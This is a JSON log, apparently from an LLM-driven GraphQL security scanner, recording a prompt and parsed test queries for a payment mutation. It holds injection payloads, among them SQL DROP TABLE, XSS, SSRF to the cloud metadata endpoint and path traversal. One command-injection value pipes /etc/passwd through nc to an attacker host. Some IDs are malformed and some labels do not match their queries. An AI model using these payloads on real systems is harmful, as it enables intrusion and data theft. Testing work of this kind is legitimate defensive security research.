@@ -1,0 +1,56 @@
+{
+  "timestamp": "20251009_181903",
+  "endpoint": "createTransaction",
+  "prompt": "\n    You are an expert in GraphQL API security testing.\n\n    Goal: generate valid GraphQL queries for the operation shown, to get successful responses (HTTP 200) quickly while exploring robustness and testing for specific vulnerability types.\n\n    \n    CRITICAL REQUIREMENT: You MUST include at least one query for a basic call and EACH of the following vulnerability types:\n    - SQL Injection\n    - XSS Injection\n    - SSRF Injection\n    - OS Command Injection\n    - Path Injection\n    - HTML Injection\n    - Query Deny Bypass (REQUIRES TWO QUERIES: non-aliased and aliased)\n    - Introspection\n    - Field Suggestions\n\n    Strict Requirements:\n    1) Queries must be syntactically valid GraphQL.\n    2) No placeholders like <id>, \"ID!\", \"value\". Use realistic literals or known real values.\n    3) You may attempt injected strings, nulls, overlong strings, and type mismatches where appropriate.\n    4) You may output 1 query(ies) but MUST cover all vulnerability types listed above.\n    5) Do not use the words \"edges\" or \"node\".\n    6) GraphQL is case-sensitive. Match the exact operation name: createTransaction.\n    7) If there are previous response pairs, use them to generate the query.\n    8) For each vulnerability type, craft queries that specifically test for that vulnerability pattern.\n    9) CRITICAL: Label each query with its vulnerability type using the format: ***<vulnerability_type>*** before each ```graphql block.\n    10) SPECIAL CASE: For Query Deny Bypass, you MUST generate TWO queries:\n        - First query: Non-aliased version (normal query structure)\n        - Second query: Aliased version (using query aliases like \"s: queryName\")\n        Both queries should test the same operation but with different structures to test access control bypass.\n    \n        Schema not provided: explore plausibly.\n        - Prefer fields/args seen in prior successful responses or known real values.\n        - Introduce at most 1–2 new fields per query.\n        - Keep selection depth minimal to maximize validity.\n        \n    Context:\n    - operation: createTransaction\n    - input (declared): createTransaction, input: {'amount': 'Float!', 'payerID': 'ID!', 'walletID': 'ID!', 'currencyID': 'ID!'}\n    - node type: mutation\n    - known real values: \n\n    Argument strategy: synthesize realistic literals by type (e.g., ISO dates, small integers, emails, UUIDv4), avoid placeholders.\n    Selection depth target: 1. Keep nested selections no deeper than 1 levels.\n    \n    Output format:\n    Each query must be in its own fenced block with a vulnerability type label:\n    Vulnerability Type Labels Are:\n    - SQL_Injection\n    - XSS_Injection\n    - SSRF_Injection\n    - OS_Command_Injection\n    - Path_Injection\n    - HTML_Injection\n    - Query_Deny_Bypass_Non_Aliased\n    - Query_Deny_Bypass_Aliased\n    - Introspection\n    - Field_Suggestions\n    - Basic_Call\n\n    ***<Vulnerability Type>***\n    ```graphql\n    <your query>\n    ```\n    \n    Example:\n    ***SQL_Injection***\n    ```graphql\n    query {\n      users(filter: \"1' OR '1'='1\") {\n        id\n        name\n      }\n    }\n    ```\n    \n    ***XSS_Injection***\n    ```graphql\n    query {\n      search(term: \"<script>alert('xss')</script>\") {\n        results\n      }\n    }\n    ```\n    ",
+  "llm_response": "```",
+  "parsed_queries": {
+    "query": [
+      {
+        "query": "\nmutation {\n  createTransaction(input: {\n    amount: 150.75,\n    payerID: \"a1b2c3d4-e5f6-4a1b-9c8d-7e8f9a1b2c3d\",\n    walletID: \"b2c3d4e5-f6g7-4b2c-9d8e-7f8g9h0i1j2k\",\n    currencyID: \"c4d5e6f7-1a2b-3c4d-5e6f-7a8b9c0d1e2f\"\n  }) {\n    transactionID\n    status\n    createdAt\n  }\n}\n",
+        "vulnerability_type": "basic_call"
+      },
+      {
+        "query": "\nmutation {\n  createTransaction(input: {\n    amount: 100.0,\n    payerID: \"1' OR '1'='1'--\",\n    walletID: \"a1b2c3d4-e5f6-4a1b-9c8d-7e8f9a1b2c3d\",\n    currencyID: \"c4d5e6f7-1a2b-3c4d-5e6f-7a8b9c0d1e2f\",\n    reference: \"'; DROP TABLE transactions;--\"\n  }) {\n    transactionID\n    status\n  }\n}\n",
+        "vulnerability_type": "sql_injection"
+      },
+      {
+        "query": "\nmutation {\n  createTransaction(input: {\n    amount: 200.5,\n    payerID: \"d4e5f6a7-b8c9-4d4e-9f0a-1b2c3d4e5f6g\",\n    walletID: \"e5f6g7h8-i9j0-4e5f-6g7h-8i9j0k1l2m3n\",\n    currencyID: \"f6g7h8i9-j0k1-4f6g-7h8i-9j0k1l2m3n4\",\n    notes: \"<script>alert(document.cookie)</script>\"\n  }) {\n    transactionID\n    status\n    notes\n  }\n}\n",
+        "vulnerability_type": "xss_injection"
+      },
+      {
+        "query": "\nmutation {\n  createTransaction(input: {\n    amount: 50.0,\n    payerID: \"g7h8i9j0-k1l2-4g7h-8i9j-0k1l2m3n4o5p\",\n    walletID: \"h8i9j0k1-l2m3-4h8i-9j0k-1l2m3n4o5p6q\",\n    currencyID: \"i9j0k1l2-m3n4-4i9j-0k1l-2m3n4o5p6q7r\",\n    callbackUrl: \"http://169.254.169.254/latest/meta-data\"\n  }) {\n    transactionID\n    status\n  }\n}\n",
+        "vulnerability_type": "ssrf_injection"
+      },
+      {
+        "query": "\nmutation {\n  createTransaction(input: {\n    amount: 300.0,\n    payerID: \"j0k1l2m3-n4o5-4j0k-1l2m-3n4o5p6q7r8s\",\n    walletID: \"k1l2m3n4-o5p6-4k1l-2m3n-4o5p6q7r8s9t\",\n    currencyID: \"l2m3n4o5-p6q7-4l2m-3n4o-5p6q7r8s9t0u\",\n    filename: \"transactions.txt; cat /etc/passwd | nc attacker.com 1234\"\n  }) {\n    transactionID\n    status\n  }\n}\n",
+        "vulnerability_type": "os_command_injection"
+      },
+      {
+        "query": "\nmutation {\n  createTransaction(input: {\n    amount: 75.25,\n    payerID: \"m3n4o5p6-q7r8-4m3n-4o5p-6q7r8s9t0u1v\",\n    walletID: \"n4o5p6q7-r8s9-4n4o-5p6q-7r8s9t0u1v2w\",\n    currencyID: \"o5p6q7r8-s9t0-4o5p-6q7r-8s9t0u1v2w3x\",\n    attachmentPath: \"../../../../etc/passwd\"\n  }) {\n    transactionID\n    status\n  }\n}\n",
+        "vulnerability_type": "path_injection"
+      },
+      {
+        "query": "\nmutation {\n  createTransaction(input: {\n    amount: 125.0,\n    payerID: \"p6q7r8s9-t0u1-4p6q-7r8s-9t0u1v2w3x4y\",\n    walletID: \"q7r8s9t0-u1v2-4q7r-8s9t-0u1v2w3x4y5z\",\n    currencyID: \"r8s9t0u1-v2w3-4r8s-9t0u-1v2w3x4y5z6a\",\n    memo: \"<img src=x onerror=alert(1)>\"\n  }) {\n    transactionID\n    status\n    memo\n  }\n}\n",
+        "vulnerability_type": "html_injection"
+      },
+      {
+        "query": "\nmutation {\n  createTransaction(input: {\n    amount: 100.0,\n    payerID: \"s9t0u1v2-w3x4-4s9t-0u1v-2w3x4y5z6a7b\",\n    walletID: \"t0u1v2w3-x4y5-4t0u-1v2w-3x4y5z6a7b8c\",\n    currencyID: \"u1v2w3x4-y5z6-4u1v-2w3x-4y5z6a7b8c9d\"\n  }) {\n    transactionID\n    status\n  }\n}\n",
+        "vulnerability_type": "query_deny_bypass_non_aliased"
+      },
+      {
+        "query": "\nmutation {\n  payment: createTransaction(input: {\n    amount: 200.0,\n    payerID: \"v2w3x4y5-z6a7-4v2w-3x4y-5z6a7b8c9d0e\",\n    walletID: \"w3x4y5z6-a7b8-4w3x-4y5z-6a7b8c9d0e1f\",\n    currencyID: \"x4y5z6a7-b8c9-4x4y-5z6a-7b8c9d0e1f2g\"\n  }) {\n    id: transactionID\n    result: status\n  }\n}\n",
+        "vulnerability_type": "query_deny_bypass_aliased"
+      },
+      {
+        "query": "\nquery {\n  createTransaction {\n    queryType { name }\n    mutationType {\n      name\n      description\n      fields {\n        name\n        description\n        args {\n          name\n          type {\n            kind\n            name\n          }\n        }\n      }\n    }\n  }\n}\n",
+        "vulnerability_type": "introspection"
+      },
+      {
+        "query": "\nmutation {\n  createTransaction(input: {\n    amount: 150.75,\n    payerID: \"y5z6a7b8-c9d0-4y5z-6a7b-8c9d0e1f2g3h\",\n    walletID: \"z6a7b8c9-d0e1-4z6a-7b8c-9d0e1f2g3h4i\",\n    currencyID: \"a7b8c9d0-e1f2-4a7b-8c9d-0e1f2g3h4i5j\"\n  }) {\n    transactionID\n    status\n  }\n}\n",
+        "vulnerability_type": "field_suggestions"
+      }
+    ]
+  },
+  "approx_tokens": 814.0,
+  "request_time": "2025-10-09T18:19:03.795815"
+}
